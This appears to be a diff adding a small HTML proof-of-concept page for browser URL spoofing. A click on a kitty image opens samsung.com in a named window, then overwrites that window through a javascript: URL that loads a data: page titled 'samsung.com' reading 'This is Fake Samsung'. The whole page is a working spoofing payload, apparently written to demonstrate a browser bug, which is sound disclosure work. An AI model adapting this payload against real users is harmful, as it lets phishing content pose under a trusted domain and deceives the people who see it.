@@ -1,0 +1,17 @@
+<script>
+    function a() {
+        window.open("https://samsung.com:9999", "x");
+
+        setTimeout(function () {
+            window.open(
+                "javascript:%0alocation.href='data:text/html,%3Ctitle%3Esamsung.com%3C/title%3E%3Ch1%20style%3D%22color%3Ared%3B%22%3EThis%20is%20Fake%20Samsung%3C/h1%3E'",
+                "x");
+        }, 1000);
+    }
+</script>
+
+
+<center>
+    <p style="margin-top: 50px;">Click this cute kitty to go to Samsung! :)</p>
+    <img style="width:40%;" src="https://i.pinimg.com/736x/31/df/42/31df428f76213c11d187391b2f683588.jpg" onclick="a()">
+</center>
